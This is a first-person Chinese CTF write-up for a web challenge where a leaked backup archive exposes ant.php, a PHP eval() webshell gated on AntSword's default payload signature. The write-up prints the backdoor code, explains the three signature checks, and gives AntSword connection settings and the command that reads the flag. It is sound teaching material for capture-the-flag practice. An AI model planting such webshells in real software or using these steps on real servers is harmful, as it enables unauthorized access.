# web_antshell —— Web 简单题（备份泄漏 + 只认蚁剑的 webshell）解题过程

> 玩家视角的第一人称解题记录。

## 0. 入场

打开题目链接，是一个「蚂蚁云 AntCloud - 主机状态监控」页面：三台节点的状态表、
几条巡检事件，顶部一条维护公告——

> 核心节点升级维护中，站点已回滚至备份版本……运维同事请下载**站点备份包**自行核对配置。

robots.txt 里也写了 `Disallow: /backup/`，就算不看公告，目录扫描同样能撞到。

## 1. 备份泄漏

下载 `/backup/antcloud_backup.zip`，解压出四个文件：

```
index.php    状态页（纯展示）
config.php   全局配置
ant.php      可疑
robots.txt
```

config.php 末尾有条不敢见光的 TODO：

```php
// TODO(lihua): 上线前记得删掉 ant.php，
// 老板问起来就说是健康检查接口，千万别说漏嘴
```

后门就是 `ant.php`。

## 2. 读后门：为什么"只认蚁剑"

```php
$p = $_POST['ant'] ?? '';
if (strpos($p, '@ini_set("display_errors"') !== 0
    || strpos($p, 'open_basedir') === false
    || strpos($p, 'asoutput()') === false
) {
    http_response_code(404);   // 一律按 404 处理
    ...
}
eval($p);
```

三重特征校验，对不上就 404：

1. payload 必须以 `@ini_set("display_errors"` **开头**；
2. 必须包含 `open_basedir`；
3. 必须包含 `asoutput()`。

这三个特征不是随手写的——它们恰好是中国蚁剑（PHP shell + 默认编码器）每次请求的固定结构：
蚁剑默认编码器把**整段 PHP 代码明文**塞进连接密码参数，开头是关闭报错的
`@ini_set("display_errors", "0");@set_time_limit(0);`，中间带 open_basedir 探测绕过，
收尾用 `asoutput()` 在随机 tag 之间回显数据。而哥斯拉/冰蝎是加密流量，菜刀的模板
结构也不同——全都过不了校验，所以"别的工具连上来连个响都听不见"。

## 3. 蚁剑连接

蚁剑 → 右键「添加数据」：

| 配置项 | 值 |
|---|---|
| URL 地址 | `http://<题目地址>/ant.php` |
| 连接密码 | `ant` |
| 连接类型 | PHP |
| 编码器 | default（默认即可） |

测试连接，基础信息（路径 / 用户 / 系统）正常返回——校验放行。

## 4. 拿 flag

虚拟终端：`cat /flag`（文件管理器进根目录双击 flag 文件同理），得到 `hctf{...}`。

## 5. 后记：不装蚁剑行不行？

行——把蚁剑那段固定结构手搓出来照样能过校验（本质是"知道蚁剑流量长什么样"），
writeup 目录里的 exp.py 就是不开蚁剑、纯手搓同构流量取 flag 的 PoC。
对手动党这题是"蚁剑流量特征"认知题；对工具党就是一道标准的蚁剑连接题。
